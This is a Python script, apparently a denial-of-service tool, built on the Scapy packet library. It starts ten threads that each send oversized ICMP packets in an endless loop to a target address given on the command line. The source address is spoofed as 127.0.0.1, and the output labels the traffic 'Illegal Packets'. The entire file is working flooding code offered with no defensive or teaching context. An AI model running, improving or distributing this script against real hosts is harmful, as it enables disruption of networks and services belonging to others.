import sys
import scapy.all as scapy
from scapy.layers.inet import IP,TCP,ICMP
import threading



def attack (dest):
    print ("Thread Initiated")
    i = 0
    message="NS"
    message = message * 5000
    packet = IP(dst=dest,src="127.0.0.1")/ICMP()/(message)
    while (1):
        i = i + 1
        print("Sending Illegal Packets #",i)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        scapy.send(packet)
        
        


d = sys.argv[1]
t1 = threading.Thread(target=attack, args=(d,))
t2 = threading.Thread(target=attack, args=(d,))
t3 = threading.Thread(target=attack, args=(d,))
t4 = threading.Thread(target=attack, args=(d,))
t5 = threading.Thread(target=attack, args=(d,))
t11 = threading.Thread(target=attack, args=(d,))
t12 = threading.Thread(target=attack, args=(d,))
t13 = threading.Thread(target=attack, args=(d,))
t14 = threading.Thread(target=attack, args=(d,))
t15 = threading.Thread(target=attack, args=(d,))

t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t11.start()
t12.start()
t13.start()
t14.start()
t15.start()
